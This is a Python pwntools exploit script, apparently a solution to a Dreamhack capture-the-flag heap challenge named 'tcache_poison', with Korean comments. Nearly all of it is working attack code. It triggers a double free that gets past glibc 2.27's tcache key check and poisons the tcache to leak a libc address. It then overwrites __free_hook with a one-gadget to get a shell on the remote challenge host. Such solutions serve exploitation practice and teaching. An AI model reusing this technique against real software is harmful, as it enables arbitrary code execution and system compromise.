from pwn import *

#p=process("./tcache_poison")
p=remote("host3.dreamhack.games",13164)
e=ELF("./tcache_poison")
libc=ELF("./libc-2.27.so")

#get offset
stdout_offset=libc.symbols["_IO_2_1_stdout_"]
free_hook_offset=libc.symbols['__free_hook']

def allocate(size, data):
    p.sendlineafter(b"Edit\n",b"1")
    p.sendlineafter(b"Size: ",str(size).encode())
    p.sendafter(b"Content: ",data)

def free():
    p.sendlineafter(b"Edit\n",b"2")

def print_c():
    p.sendlineafter(b"Edit\n",b"3")

def edit(data):
    p.sendlineafter(b"Edit\n",b"4")
    p.sendafter(b"Edit chunk: ",data)

#tcache poison
#tcache->dreamhack
allocate(0x30,b'dreamhack')
free()

#DFB mitigation 우회, key 조작
edit(b'B'*0x8+b"\x00")
free()
#tcache->dreamhack->dreamhack

#stdout adress add
stdout=e.symbols["stdout"]
allocate(0x30,p64(stdout))
#tcache->dreamhack->stdout->_IO_2_1_stdout_->...

allocate(0x30,b"B"*8)
#tcache->stdout->_IO_2_1_stdout_->...
allocate(0x30, p64(stdout_offset)[0:1]) #_IO_2_1_stdout_값 오염 방지
#tcache->_IO_2_1_stdout_->...

print_c()
p.recvuntil(b'Content: ')
stdout_addr=u64(p.recv(6).ljust(8,b"\x00"))
base=stdout_addr-stdout_offset
free_hook=base+free_hook_offset
og=0x4f432
onegadget=og+base

allocate(0x60,b'dreamhack')
free()
#tcache->dreamhack
edit(b'B'*0x8+b"\x00")
free()
#tcache->dreamhack->dreamhack
allocate(0x60,p64(free_hook))
#tcache->dreamhack->freehook
allocate(0x60,b"B"*8)
#tacache->freehook
allocate(0x60,p64(onegadget))
#freehook=onegadget
free()

p.interactive()